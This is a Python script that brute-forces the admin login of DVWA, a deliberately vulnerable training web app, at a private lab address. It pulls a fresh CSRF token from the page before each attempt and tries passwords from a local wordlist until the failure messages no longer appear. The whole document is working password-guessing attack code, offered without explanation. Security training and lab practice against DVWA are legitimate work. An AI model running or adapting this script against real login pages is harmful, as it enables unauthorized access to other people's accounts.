import requests
from bs4 import BeautifulSoup

url = 'http://192.168.5.130/DVWA/login.php'
username = 'admin'
wordlist_path = '/home/kali/Desktop/bruteforce_attacklist.txt'

session = requests.Session()
headers = {
    'User-Agent': 'Mozilla/5.0'
}

with open(wordlist_path, 'r') as file:
    for password in file:
        password = password.strip()
        response = session.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        token_input = soup.find('input', {'name': 'user_token'})
        if not token_input:
            print("❌ Token not found!")
            break

        csrf_token = token_input.get('value')

        payload = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': csrf_token
        }

        login_response = session.post(url, data=payload, headers=headers)

        if "Login failed" not in login_response.text and "CSRF token is incorrect" not in login_response.text:
            print(f"✅ Password found! ➜ {password}")
            break
